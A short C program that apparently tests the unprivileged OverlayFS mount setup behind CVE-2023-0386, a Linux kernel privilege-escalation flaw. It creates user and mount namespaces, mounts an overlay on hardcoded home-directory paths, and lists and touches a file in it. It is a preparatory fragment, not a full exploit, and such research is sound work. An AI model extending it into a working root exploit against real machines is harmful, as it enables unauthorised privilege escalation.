#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <linux/fs.h>

int main(int argc, char const *argv[])
{
    /* code */
    /*
    mount -t overlay overlay -o lowerdir=/tmp/test1,upperdir=/home/obric/CVE-2023-0386/upper,workdir=/home/obric/CVE-2023-0386/work /home/obric/CVE-2023-0386/fs
    */
    int ret;
    ret = unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWCGROUP);
    if (ret < 0)
    {
        perror("mnt failed");
        return -1;
    }
    puts("[+] unshare mnt success");

    char lowerdir[] = "/home/xk/ocean/test_overlay/lower";
    char upperdir[] = "/home/xk/ocean/test_overlay/upper";
    char workdir[] = "/home/xk/ocean/test_overlay/work";
    char targetdir[] = "/home/xk/ocean/test_overlay/fs";

    char options[0x1000];
    snprintf(options, 0x1000, "lowerdir=%s,upperdir=%s,workdir=%s,rw", lowerdir, upperdir, workdir);
    // ret=mount("overlay", targetdir, "overlay", MS_NODEV, options);
    // ret = mount("none", "/", "none", MS_SLAVE | MS_REC, 0);
    ret = mount("overlay", targetdir, "overlay", MS_NOATIME | MS_NODIRATIME | MS_NODEV, options);
    if (ret < 0)
    {
        perror("mount overlay");
        return -1;
    }
    puts("[+] OverlayFS mounted.");
    char cmd[0x1000];
    sprintf(cmd, "ls -la %s", "/home/xk/ocean/test_overlay/fs");
    system(cmd);
    sprintf(cmd, "touch %s", "/home/xk/ocean/test_overlay/fs/mnt");
    system(cmd);
    getchar();

    umount(targetdir);

    return 0;
}
